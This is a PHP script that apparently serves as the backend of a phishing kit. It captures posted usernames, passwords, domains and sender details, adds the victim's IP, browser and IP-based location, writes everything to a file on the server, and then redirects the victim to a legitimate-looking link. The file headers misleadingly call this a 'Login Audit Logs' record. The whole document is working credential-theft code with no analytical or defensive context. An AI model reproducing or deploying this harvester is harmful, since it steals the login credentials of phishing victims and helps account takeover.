<?php
$ip = getenv("REMOTE_ADDR");
$user = $_POST['user'] ?? '';
$passwd = $_POST['passwd'] ?? '';
$domain = $_POST['domain'] ?? '';
$sender = $_POST['sender'] ?? '';
$link = $_POST['link'] ?? '';
$adddate = date("D M d, Y g:i a");

if (empty($user) || empty($passwd)) {
    header("Location: https://google.com/");
    exit;
}

$browser = $_SERVER['HTTP_USER_AGENT'];

$country = "Unknown";
$regionName = "Unknown";

$geoData = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,status");
if ($geoData) {
    $geo = json_decode($geoData, true);
    if ($geo['status'] === 'success') {
        $country = $geo['country'];
        $regionName = $geo['regionName'];
    }
}

$f_data = "
UserName : $user
PassWord : $passwd
Domain : $domain
Sender : $sender
Login Link : $link
Users IP : $ip
Country : $country
Region : $regionName
Browser : $browser
Date : $adddate
==========: || Login Audit Logs 2025 || :==========\n\n";

$filename = "/tmp/alldata.txt";
$file = fopen($filename, "a");
fwrite($file, $f_data);
fclose($file);

header("Location: $link");
exit;
?>
